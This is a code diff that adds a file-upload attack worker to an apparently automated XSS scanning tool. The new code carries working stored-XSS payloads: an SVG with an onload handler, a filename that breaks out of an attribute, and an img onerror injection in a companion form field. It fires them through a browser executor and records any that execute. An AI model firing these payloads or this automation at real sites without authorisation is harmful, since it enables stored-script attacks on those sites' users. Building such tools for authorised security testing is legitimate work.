@@ -25,7 +25,7 @@ from typing import TYPE_CHECKING, Any
 
 if TYPE_CHECKING:
     import multiprocessing
-    from ai_xss_generator.types import PostFormTarget
+    from ai_xss_generator.types import PostFormTarget, UploadTarget
 
 log = logging.getLogger(__name__)
 
@@ -135,7 +135,7 @@ class WorkerResult:
     params_tested: int = 0
     params_reflected: int = 0
     # Work item type — used by session checkpointing
-    kind: str = "get"       # "get" | "post"
+    kind: str = "get"       # "get" | "post" | "upload" | "dom"
     dead_target: bool = False
     dead_reason: str = ""
     target_tier: str = ""
@@ -1821,6 +1821,187 @@ def _run_dom(
         target_tier=getattr(target_disposition, "tier", "live"),
         local_model_rounds=local_model_rounds,
         cloud_model_rounds=cloud_model_rounds,
+        fallback_rounds=fallback_rounds,
+        escalation_reasons=escalation_reasons,
+    ))
+
+
+def _upload_attempts(upload_target: "UploadTarget") -> list[dict[str, Any]]:
+    first_companion = upload_target.companion_field_names[0] if upload_target.companion_field_names else ""
+    benign_defaults = {name: "axss" for name in upload_target.companion_field_names}
+    svg_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>'
+    attempts: list[dict[str, Any]] = [
+        {
+            "transform_name": "upload_svg_inline",
+            "file_name": "axss-avatar.svg",
+            "file_content": svg_payload,
+            "companion_overrides": dict(benign_defaults),
+            "payload_summary": "inline SVG upload with onload handler",
+        },
+        {
+            "transform_name": "upload_filename_reflection",
+            "file_name": "avatar\"><svg/onload=alert(1)>.svg",
+            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
+            "companion_overrides": dict(benign_defaults),
+            "payload_summary": "filename breakout via SVG upload",
+        },
+    ]
+    if first_companion:
+        companion_overrides = dict(benign_defaults)
+        companion_overrides[first_companion] = '<img src=x onerror=alert(1)>'
+        attempts.append({
+            "transform_name": "upload_companion_field",
+            "file_name": "axss-profile.svg",
+            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
+            "companion_overrides": companion_overrides,
+            "payload_summary": f"companion field {first_companion}=<img src=x onerror=alert(1)>",
+        })
+    return attempts
+
+
+def _make_upload_finding(
+    *,
+    upload_target: "UploadTarget",
+    result: Any,
+    waf: str | None,
+    payload_summary: str,
+) -> ConfirmedFinding:
+    return ConfirmedFinding(
+        url=upload_target.action_url,
+        param_name="+".join(upload_target.file_field_names),
+        context_type="stored_upload",
+        sink_context="upload_render",
+        payload=payload_summary,
+        transform_name=result.transform_name,
+        execution_method=result.method,
+        execution_detail=result.detail,
+        waf=waf,
+        surviving_chars="",
+        fired_url=result.fired_url,
+        source="phase1_transform",
+        cloud_escalated=False,
+    )
+
+
+def run_upload_worker(
+    upload_target: "UploadTarget",
+    waf_hint: str | None,
+    timeout_seconds: int,
+    result_queue: "multiprocessing.Queue",
+    auth_headers: dict[str, str] | None = None,
+    sink_url: str | None = None,
+) -> None:
+    """Worker entry point for multipart upload targets."""
+    start_time = time.monotonic()
+
+    def _put_result(result: WorkerResult) -> None:
+        result.duration_seconds = time.monotonic() - start_time
+        result_queue.put(result)
+
+    try:
+        _run_upload(
+            upload_target=upload_target,
+            waf_hint=waf_hint,
+            timeout_seconds=timeout_seconds,
+            put_result=_put_result,
+            auth_headers=auth_headers,
+            sink_url=sink_url,
+        )
+    except Exception as exc:
+        log.exception("Upload worker crashed for %s", upload_target.action_url)
+        _put_result(WorkerResult(
+            url=upload_target.action_url,
+            status="error",
+            error=str(exc),
+            kind="upload",
+        ))
+
+
+def _run_upload(
+    *,
+    upload_target: "UploadTarget",
+    waf_hint: str | None,
+    timeout_seconds: int,
+    put_result: Any,
+    auth_headers: dict[str, str] | None = None,
+    sink_url: str | None = None,
+) -> None:
+    from ai_xss_generator.active.executor import ActiveExecutor
+
+    if not upload_target.file_field_names:
+        put_result(WorkerResult(
+            url=upload_target.action_url,
+            status="no_params",
+            waf=waf_hint,
+            kind="upload",
+            dead_target=True,
+            dead_reason="No file input fields were available for upload testing.",
+            target_tier="hard_dead",
+        ))
+        return
+
+    deadline = time.monotonic() + max(timeout_seconds, 60)
+
+    def _timed_out() -> bool:
+        return time.monotonic() > deadline
+
+    executor = ActiveExecutor(auth_headers=auth_headers)
+    try:
+        executor.start()
+    except Exception as exc:
+        put_result(WorkerResult(
+            url=upload_target.action_url,
+            status="error",
+            error=f"Playwright start failed: {exc}",
+            waf=waf_hint,
+            kind="upload",
+            target_tier="high_value",
+        ))
+        return
+
+    confirmed_findings: list[ConfirmedFinding] = []
+    total_transforms_tried = 0
+    fallback_rounds = 0
+    escalation_reasons = [
+        "Artifact workflow discovered — using bounded deterministic upload attempts first.",
+    ]
+    try:
+        for attempt in _upload_attempts(upload_target):
+            if _timed_out():
+                break
+            total_transforms_tried += 1
+            fallback_rounds += 1
+            result = executor.fire_upload(
+                source_page_url=upload_target.source_page_url,
+                action_url=upload_target.action_url,
+                file_field_names=upload_target.file_field_names,
+                companion_overrides=attempt["companion_overrides"],
+                file_name=attempt["file_name"],
+                file_content=attempt["file_content"],
+                transform_name=attempt["transform_name"],
+                sink_url=sink_url,
+            )
+            if result.confirmed:
+                confirmed_findings.append(_make_upload_finding(
+                    upload_target=upload_target,
+                    result=result,
+                    waf=waf_hint,
+                    payload_summary=attempt["payload_summary"],
+                ))
+                break
+    finally:
+        executor.stop()
+
+    put_result(WorkerResult(
+        url=upload_target.action_url,
+        status="confirmed" if confirmed_findings else "no_execution",
+        confirmed_findings=confirmed_findings,
+        transforms_tried=total_transforms_tried,
+        waf=waf_hint,
+        params_tested=len(upload_target.file_field_names) + len(upload_target.companion_field_names),
+        params_reflected=0,
+        kind="upload",
+        target_tier="high_value",
         fallback_rounds=fallback_rounds,
         escalation_reasons=escalation_reasons,
     ))
